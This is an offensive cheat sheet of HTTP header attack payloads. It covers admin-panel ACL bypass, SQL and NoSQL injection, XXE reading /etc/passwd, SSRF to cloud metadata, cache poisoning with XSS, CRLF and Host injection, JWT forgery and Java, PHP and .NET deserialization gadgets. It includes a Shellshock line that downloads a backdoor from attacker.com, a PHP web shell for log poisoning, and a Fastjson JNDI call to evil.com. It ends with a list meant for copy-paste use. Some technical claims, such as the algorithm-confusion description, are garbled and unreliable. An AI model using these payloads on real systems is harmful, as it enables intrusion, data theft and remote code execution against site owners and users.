# HEADERS OFFENSIVE COMPLETE CHEAT SHEET

## 1. BYPASS ACLs / ACCESS TO ADMIN PANELS

These headers trick load balancers, proxies, or backends into rewriting the path without changing the visible path.

```
GET /admin HTTP/2
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-Scheme: http
```

**Typical payload to delete a user:**
```
GET /?username=carlos HTTP/2
Host: vulnerable-site.com
Cookie: session=...
X-Original-Url: /admin/delete
```

**Other headers to test bypass:**
```
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: localhost
X-Forwarded-Server: localhost
```

---

## 2. SQL INJECTION VIA HEADERS

Many WAFs do not inspect headers like `User-Agent`, `Referer`, or `X-Forwarded-For`.

```
GET / HTTP/1.1
Host: victim.com
User-Agent: ' OR 1=1-- -
Referer: ' UNION SELECT @@version, null, null-- -
X-Forwarded-For: 127.0.0.1' OR SLEEP(5)-- -
Cookie: session=' UNION SELECT username, password FROM users-- -
```

**Common payloads:**
```
User-Agent: ' OR '1'='1
X-Forwarded-For: 127.0.0.1' AND 1=1-- -
Referer: http://evil.com/' OR 1=1; DROP TABLE users;--
```

---

## 3. XXE (XML External Entity) VIA HEADERS

Some apps process XML in headers like `Content-Type` or `X-Requested-With`.

```
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: application/xml
X-Requested-With: <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
Content-Length: 0

<root>&xxe;</root>
```

**Payload for SSRF:**
```
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

---

## 4. SSRF (Server-Side Request Forgery) VIA HEADERS

Headers that control redirections or internal proxies:

```
GET /api/fetch?url=example.com HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
X-Rewrite-URL: http://169.254.169.254/latest/meta-data/
Referer: http://metadata.google.internal/
```

**Payloads for internal SSRF:**
```
X-Original-URL: http://localhost/admin
X-Forwarded-Host: internal.corp.com
X-Proxy-Host: 127.0.0.1:8080
```

---

## 5. CACHE POISONING AND WEB CACHE DECEPTION

Inject a header that forces the cache to store a response for another URL.

```
GET /some-path HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
X-Original-Url: /admin
X-Rewrite-URL: /admin
Pragma: x-get-cache-key
Cache-Control: no-cache
```

**Payload to poison cache with XSS:**
```
GET /?dontpoisone= HTTP/1.1
Host: victim.com
X-Forwarded-Host: "><script>alert(1)</script>
```

---

## 6. HOST HEADER INJECTION / ATTACKS

The `Host` header is critical for virtual hosting and is often vulnerable:

```
GET /admin HTTP/1.1
Host: evil.com
```

**Payloads:**
```
Host: target.com%0d%0aX-Forwarded-For: 127.0.0.1
Host: target.com:443
Host: target.com/../admin
Host: target.com@evil.com
```

**For SSRF via Host:**
```
Host: 169.254.169.254
```

---

## 7. RCE VIA HEADERS (LOG POISONING / SHELLSHOCK)

If the app logs headers into files that are later included:

```
GET / HTTP/1.1
Host: victim.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Payload for Shellshock (old but still useful):**
```
User-Agent: () { :; }; /bin/bash -c 'wget http://attacker.com/backdoor.sh'
```

---

## 8. CRLF INJECTION (HTTP RESPONSE SPLITTING)

Inject line breaks to manipulate HTTP responses:

```
GET /redirect?url=http://example.com%0d%0aX-Forwarded-For:127.0.0.1 HTTP/1.1
Host: victim.com
```

**Payloads:**
```
%0d%0aSet-Cookie: session=evil
%0d%0aLocation: http://evil.com
```

**Used for XSS:**
```
/redirect?url=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

---

## 9. CORS MISCONFIGURATION

Abuse the `Origin` header to steal data:

```
GET /api/sensitive HTTP/1.1
Host: victim.com
Origin: https://evil.com
```

**Expected response:**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If it responds with `*`, it is also exploitable but without cookies.

---

## 10. SQL INJECTION IN SPECIFIC HEADERS

```
X-Forwarded-For: 127.0.0.1' AND 1=1 UNION SELECT username, password FROM users-- -
X-Client-IP: 127.0.0.1' OR 1=1-- -
X-Remote-IP: 127.0.0.1' AND SLEEP(5)-- -
```

---

## 11. HEADERS FOR WAF / RATE LIMITING BYPASS

- `X-Forwarded-For: 127.0.0.1` (change on each request to evade blocking)
- `X-Originating-IP: 127.0.0.1`
- `X-Remote-Addr: 127.0.0.1`
- `X-Client-IP: 127.0.0.1`

**Variants with random IPs:**
```
X-Forwarded-For: 192.168.1.1, 10.0.0.1, 127.0.0.1
```

---

## 12. HEADERS FOR BRUTE FORCE / FUZZING

Fuzz these headers with Burp Intruder or ffuf:

```
X-Original-URL
X-Rewrite-URL
X-Forwarded-For
X-Forwarded-Host
X-Host
X-Proxy-Host
X-Forwarded-Scheme
X-Originating-IP
X-Remote-IP
X-Client-IP
X-Custom-IP-Authorization
X-Proxy-IP
X-Real-IP
```

---

## 13. FULL EXAMPLE OF OFFENSIVE REQUEST

```
GET /admin/delete?username=carlos HTTP/2
Host: vulnerable-site.com
Cookie: session=ZmhgodLneyrTe4j9vWC1Y7r9PGNhWLOf
X-Original-Url: /admin/delete
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Rewrite-URL: /admin/delete
User-Agent: ' OR 1=1-- -
Referer: http://localhost/admin
Cache-Control: no-cache
```

---

# HEADERS OFFENSIVE (PART 2): JWT, GRAPHQL, NOSQLI, DESERIALIZATION

## 14. HEADERS FOR JWT BYPASS

### A) "None" Algorithm Attack
The server accepts unsigned tokens if the `alg` header is `none`:

```
POST /api/login HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
Content-Type: application/json

{"username":"admin","password":"admin"}
```

**Header payload:**
```
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

### B) Algorithm Confusion HS256 to RS256
If the server uses HS256 (symmetric) but accepts RS256 (asymmetric), you can use the public key as the secret:

```
Authorization: Bearer [JWT signed with RS256 using the server's public key]
```

**Header payload:**
```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.[signature_calculated_with_public_key]
```

### C) JWT Header Injection (JKU / X5U)
Force the server to use a public key you control:

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImpla3UiOiJodHRwOi8vZXZpbC5jb20va2V5Lmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.[signature]
```

**Malicious headers:**
```
Authorization: Bearer [JWT_with_malicious_jku]
X-Forwarded-Host: evil.com
X-Original-URL: /jwks.json
```

### D) Kid (Key ID) Path Traversal
Abuse `kid` to read files from the system:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.[signature]
```

**Payloads for kid:**
```
kid: ../../../../etc/passwd
kid: /dev/null
kid: http://evil.com/key
kid: |echo "malicious_key"
```

### E) Cookie to Header (JWT Smuggling)
If the app expects JWT in Cookie but also accepts Authorization:

```
GET /admin HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.[signature]
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.[admin_signature]
```

---

## 15. HEADERS FOR GRAPHQL

### A) Query Introduction via Header
Some apps allow sending the GraphQL query in headers:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
X-GraphQL-Query: { __typename }
GraphQL-Query: query { users { id name password } }
X-Operation-Name: GetUsers
```

**Payloads:**
```
X-GraphQL-Query: { __schema { types { name fields { name } } } }
GraphQL-Query: mutation { deleteUser(id: 1) }
X-Introspection: true
```

### B) Rate Limiting Bypass via Headers
Rotate IPs or use headers to avoid blocking:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.100
X-Remote-Addr: 10.0.0.2
Client-IP: 10.0.0.3
```

### C) SQLi through Headers in GraphQL
If the resolver uses headers in queries:

```
POST /graphql HTTP/1.1
Host: target.com
User-Agent: ' OR 1=1-- -
X-Forwarded-For: 127.0.0.1' UNION SELECT null,username,password FROM users-- -
Referer: '; DROP TABLE users;--
```

**Full payload:**
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
X-Client-ID: 1' OR '1'='1
User-Agent: ' UNION SELECT @@version, null-- -

{"query":"query { user(id: $id) { name } }","variables":{"id":"1' OR 1=1-- -"}}
```

### D) SSRF via Headers in GraphQL
If the resolver makes requests to URLs based on headers:

```
POST /graphql HTTP/1.1
Host: target.com
X-Forwarded-Host: 169.254.169.254
X-Forwarded-For: metadata.google.internal
X-Rewrite-URL: http://localhost/admin

{"query":"query { getData }"}
```

### E) Schema Validation Bypass
Use headers to change the execution context:

```
X-APOLLO-OPERATION-NAME: adminQuery
X-APOLLO-OPERATION-ID: getSensitiveData
X-GraphQL-Cost: 1
X-GraphQL-MaxDepth: 100
```

---

## 16. HEADERS FOR NOSQL INJECTION

### A) Injection in Headers (MongoDB)
MongoDB operators can be injected in headers:

```
GET /api/users HTTP/1.1
Host: target.com
User-Agent: {'$ne': null}
X-Forwarded-For: {'$gt': ''}
X-Client-ID: {'$regex': '.*'}
Cookie: session={'$ne': null}
```

**Common payloads:**
```
User-Agent: {"$ne": null}
X-Forwarded-For: {"$gt": ""}
Referer: {"$regex": "^admin"}
X-API-Key: {"$in": [1,2,3]}
```

### B) Authentication Bypass (MongoDB)
Inject into the header used as a filter:

```
POST /login HTTP/1.1
Host: target.com
X-User: admin
X-Password: {"$ne": ""}
X-Username: {"$regex": "^admin"}
```

**Payloads:**
```
X-Username: {"$ne": null}
X-Email: {"$exists": true}
X-Role: {"$gt": ""}
```

### C) Injection to Extract Data
Use operators for boolean-based blind:

```
GET /api/profile HTTP/1.1
Host: target.com
X-User-ID: {"$regex": "^admin.*", "$options": "i"}
X-Session: {"$where": "this.username == 'admin'"}
Cookie: {"$where": "this.password[0] == 'a'"}
```

**Payloads for extraction:**
```
X-User: {"$where": "this.password.match(/^a.*/)"}
X-ID: {"$ne": null, "$where": "1==1"}
X-Token: {"$regex": ".*"}
```

### D) Date Operator Injection (MongoDB)
```
X-Date: {"$gt": "2020-01-01"}
X-Created: {"$lt": "2024-01-01"}
X-Timestamp: {"$gte": "2023-01-01", "$lte": "2024-12-31"}
```

### E) Array Injection (MongoDB)
```
X-Roles: ["admin", {"$ne": null}]
X-Tags: [{"$regex": ".*"}]
X-IDs: [1, {"$gt": 0}]
```

---

## 17. HEADERS FOR DESERIALIZATION (JAVA, PHP, .NET)

### A) Java (Jackson, Fastjson, XStream)
Headers can contain Base64 serialized payloads:

```
POST /api/deserialize HTTP/1.1
Host: target.com
X-Java-Serialized: rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZSRJdGVyYXRvckNvbXBhcmF0b3IAAAAAAAAAAgIAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhz...
Content-Type: application/x-java-serialized-object
```

**Payloads:**
```
X-Java-Object: [base64_serialized_payload]
X-Deserialize: [ysoserial_payload]
X-Object-Data: [hex_encoded_payload]
```

**Example with Fastjson:**
```
X-Fastjson: {"@type":"java.net.InetAddress","val":"evil.com"}
X-Fastjson-Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
```

### B) PHP (unserialize)
Headers can contain serialized PHP objects in Base64 or URL encoding:

```
POST /api/upload HTTP/1.1
Host: target.com
X-PHP-Object: Tzo4OiJTdHVkZW50IjoyOntzOjc6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjc6InBhc3N3b3JkIjtzOjU6InBhc3N3ZCI7fQ==
X-Serialized: O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
Cookie: O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
```

**PHP payloads:**
```
X-Data: O:8:"User":1:{s:4:"name";s:5:"admin";}
X-Object: O:8:"stdClass":1:{s:8:"callback";s:17:"system('id')";}
X-Serialize: a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}
```

**RCE via PHPGGC:**
```
X-PHP-Payload: TzozMjoiR3V6emxlSHR0cENsaWVudFwvQ2xpZW50IjoyOntzOjU6ImNvb2tpZSI7YjoxO3M6NzoiY3VybG9wdHMiO2E6MTp7aTowO2E6Mjp7aTowO3M6MTc6Imh0dHA6Ly9ldmlsLmNvbSI7aToxO3M6NToiZXZpbCI7fX19
```

### C) .NET (BinaryFormatter, Json.NET, ViewState)
```
POST /api/data HTTP/1.1
Host: target.com
X-DotNet-ViewState: /wEPDwUJODU0Njc1MDYyZGQm/vY9l5qS8C5gZgZy8LmW1XKv5Q==
X-BinaryFormatter: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
X-Object-State: [base64_ysoserial_net_payload]
```

**.NET payloads:**
```
X-ViewState: /wEPDwUKMTIzNDU2Nzg5ZGQ=
X-Object: [ysoserial.net_payload_base64]
X-Serialized: [BinaryFormatter_payload]
```

**YSoSerial.Net payloads via header:**
```
X-Payload: { "type":"System.Collections.ArrayList", "payload":"..." }
X-Data: [ActivitySurrogateSelector_payload]
```

### D) Headers to Detect Deserialization
Send payloads that generate errors or delays:

**Java:**
```
X-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhShWWmM0AwAAeHB3DAAAAAI/QAAAAAAAAXcEAAAAAXB4
```

**PHP:**
```
X-PHP-Object: O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
```

**.NET:**
```
X-DotNet-Object: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
```

---

## 18. COMBINED EXAMPLE (Multiple Techniques)

```
POST /graphql HTTP/2
Host: vulnerable-site.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
X-GraphQL-Query: { users { id name password } }
X-Forwarded-For: 127.0.0.1' OR 1=1-- -
User-Agent: {'$ne': null}
X-Java-Serialized: rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZSRJdGVyYXRvckNvbXBhcmF0b3IAAAAAAAAAAgIAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhz...

{"query":"mutation { deleteUser(id: $id) }","variables":{"id":"1"}}
```

---

## 19. COMPLETE LIST OF HEADERS FOR FUZZING

**JWT:**
```
Authorization
Cookie (session, jwt, token)
X-JWT-Token
X-Access-Token
```

**GraphQL:**
```
X-GraphQL-Query
GraphQL-Query
X-Operation-Name
X-Introspection
X-APOLLO-OPERATION-NAME
```

**NoSQL:**
```
X-User-ID
X-Username
X-Email
X-Session
X-API-Key
X-Roles
```

**Deserialization:**
```
X-Java-Serialized
X-PHP-Object
X-DotNet-ViewState
X-Serialized
X-Object
X-Data
X-Payload
```

---

## 20. RECOMMENDED TOOLS

- **Burp Suite** + Extensions: **JWT Editor**, **GraphQL Raider**, **NoSQLi Scanner**
- **ysoserial** (Java, .NET)
- **PHPGGC** (PHP)
- **jwt_tool** for JWT attacks
- **graphql-cop** for GraphQL scanning
- **nosqlmap** for automatic NoSQLi

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-Scheme: http
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: localhost
X-Forwarded-Server: localhost
User-Agent: ' OR 1=1-- -
Referer: ' UNION SELECT @@version, null, null-- -
X-Forwarded-For: 127.0.0.1' OR SLEEP(5)-- -
Cookie: session=' UNION SELECT username, password FROM users-- -
User-Agent: ' OR '1'='1
X-Forwarded-For: 127.0.0.1' AND 1=1-- -
Referer: http://evil.com/' OR 1=1; DROP TABLE users;--
Content-Type: application/xml
X-Requested-With: <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
X-Rewrite-URL: http://169.254.169.254/latest/meta-data/
Referer: http://metadata.google.internal/
X-Original-URL: http://localhost/admin
X-Forwarded-Host: internal.corp.com
X-Proxy-Host: 127.0.0.1:8080
X-Forwarded-Host: evil.com
Pragma: x-get-cache-key
Cache-Control: no-cache
X-Forwarded-Host: "><script>alert(1)</script>
Host: evil.com
Host: target.com%0d%0aX-Forwarded-For: 127.0.0.1
Host: target.com:443
Host: target.com/../admin
Host: target.com@evil.com
Host: 169.254.169.254
User-Agent: <?php system($_GET['cmd']); ?>
User-Agent: () { :; }; /bin/bash -c 'wget http://attacker.com/backdoor.sh'
%0d%0aSet-Cookie: session=evil
%0d%0aLocation: http://evil.com
Origin: https://evil.com
X-Forwarded-For: 127.0.0.1' AND 1=1 UNION SELECT username, password FROM users-- -
X-Client-IP: 127.0.0.1' OR 1=1-- -
X-Remote-IP: 127.0.0.1' AND SLEEP(5)-- -
X-Forwarded-For: 192.168.1.1, 10.0.0.1, 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Proxy-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.[signature_calculated_with_public_key]
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImpla3UiOiJodHRwOi8vZXZpbC5jb20va2V5Lmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.[signature]
kid: ../../../../etc/passwd
kid: /dev/null
kid: http://evil.com/key
kid: |echo "malicious_key"
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.[signature]
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.[admin_signature]
X-GraphQL-Query: { __typename }
GraphQL-Query: query { users { id name password } }
X-Operation-Name: GetUsers
X-GraphQL-Query: { __schema { types { name fields { name } } } }
GraphQL-Query: mutation { deleteUser(id: 1) }
X-Introspection: true
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.100
X-Remote-Addr: 10.0.0.2
Client-IP: 10.0.0.3
X-Client-ID: 1' OR '1'='1
User-Agent: ' UNION SELECT @@version, null-- -
X-Forwarded-Host: 169.254.169.254
X-Forwarded-For: metadata.google.internal
X-APOLLO-OPERATION-NAME: adminQuery
X-APOLLO-OPERATION-ID: getSensitiveData
X-GraphQL-Cost: 1
X-GraphQL-MaxDepth: 100
User-Agent: {'$ne': null}
X-Forwarded-For: {'$gt': ''}
X-Client-ID: {'$regex': '.*'}
Cookie: session={'$ne': null}
User-Agent: {"$ne": null}
X-Forwarded-For: {"$gt": ""}
Referer: {"$regex": "^admin"}
X-API-Key: {"$in": [1,2,3]}
X-User: admin
X-Password: {"$ne": ""}
X-Username: {"$regex": "^admin"}
X-Username: {"$ne": null}
X-Email: {"$exists": true}
X-Role: {"$gt": ""}
X-User-ID: {"$regex": "^admin.*", "$options": "i"}
X-Session: {"$where": "this.username == 'admin'"}
Cookie: {"$where": "this.password[0] == 'a'"}
X-User: {"$where": "this.password.match(/^a.*/)"}
X-ID: {"$ne": null, "$where": "1==1"}
X-Token: {"$regex": ".*"}
X-Date: {"$gt": "2020-01-01"}
X-Created: {"$lt": "2024-01-01"}
X-Timestamp: {"$gte": "2023-01-01", "$lte": "2024-12-31"}
X-Roles: ["admin", {"$ne": null}]
X-Tags: [{"$regex": ".*"}]
X-IDs: [1, {"$gt": 0}]
X-Java-Serialized: rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZSRJdGVyYXRvckNvbXBhcmF0b3IAAAAAAAAAAgIAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhz...
X-Java-Object: [base64_serialized_payload]
X-Deserialize: [ysoserial_payload]
X-Object-Data: [hex_encoded_payload]
X-Fastjson: {"@type":"java.net.InetAddress","val":"evil.com"}
X-Fastjson-Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
X-PHP-Object: Tzo4OiJTdHVkZW50IjoyOntzOjc6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjc6InBhc3N3b3JkIjtzOjU6InBhc3N3ZCI7fQ==
X-Serialized: O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
Cookie: O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
X-Data: O:8:"User":1:{s:4:"name";s:5:"admin";}
X-Object: O:8:"stdClass":1:{s:8:"callback";s:17:"system('id')";}
X-Serialize: a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}
X-PHP-Payload: TzozMjoiR3V6emxlSHR0cENsaWVudFwvQ2xpZW50IjoyOntzOjU6ImNvb2tpZSI7YjoxO3M6NzoiY3VybG9wdHMiO2E6MTp7aTowO2E6Mjp7aTowO3M6MTc6Imh0dHA6Ly9ldmlsLmNvbSI7aToxO3M6NToiZXZpbCI7fX19
X-DotNet-ViewState: /wEPDwUJODU0Njc1MDYyZGQm/vY9l5qS8C5gZgZy8LmW1XKv5Q==
X-BinaryFormatter: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
X-Object-State: [base64_ysoserial_net_payload]
X-ViewState: /wEPDwUKMTIzNDU2Nzg5ZGQ=
X-Object: [ysoserial.net_payload_base64]
X-Serialized: [BinaryFormatter_payload]
X-Payload: { "type":"System.Collections.ArrayList", "payload":"..." }
X-Data: [ActivitySurrogateSelector_payload]
X-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhShWWmM0AwAAeHB3DAAAAAI/QAAAAAAAAXcEAAAAAXB4
X-DotNet-Object: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
X-JWT-Token: [jwt_token]
X-Access-Token: [access_token]
X-GraphQL-Query: { users { id name password } }
GraphQL-Query: query { users { id name password } }
X-APOLLO-OPERATION-NAME: adminQuery
X-User-ID: {"$regex": "^admin.*", "$options": "i"}
X-Session: {"$where": "this.username == 'admin'"}
Cookie: {"$where": "this.password[0] == 'a'"}
X-Data: O:8:"User":1:{s:4:"name";s:5:"admin";}
X-Object: O:8:"stdClass":1:{s:8:"callback";s:17:"system('id')";}
X-Serialize: a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}
X-PHP-Payload: TzozMjoiR3V6emxlSHR0cENsaWVudFwvQ2xpZW50IjoyOntzOjU6ImNvb2tpZSI7YjoxO3M6NzoiY3VybG9wdHMiO2E6MTp7aTowO2E6Mjp7aTowO3M6MTc6Imh0dHA6Ly9ldmlsLmNvbSI7aToxO3M6NToiZXZpbCI7fX19
X-DotNet-ViewState: /wEPDwUJODU0Njc1MDYyZGQm/vY9l5qS8C5gZgZy8LmW1XKv5Q==
X-BinaryFormatter: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
X-Object-State: [base64_ysoserial_net_payload]
X-ViewState: /wEPDwUKMTIzNDU2Nzg5ZGQ=
X-Object: [ysoserial.net_payload_base64]
X-Serialized: [BinaryFormatter_payload]
X-Payload: { "type":"System.Collections.ArrayList", "payload":"..." }
X-Data: [ActivitySurrogateSelector_payload]
X-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhShWWmM0AwAAeHB3DAAAAAI/QAAAAAAAAXcEAAAAAXB4
X-DotNet-Object: AAEAAD/////UAAAAAAAAAAAAAAAAAAAAAA...
```
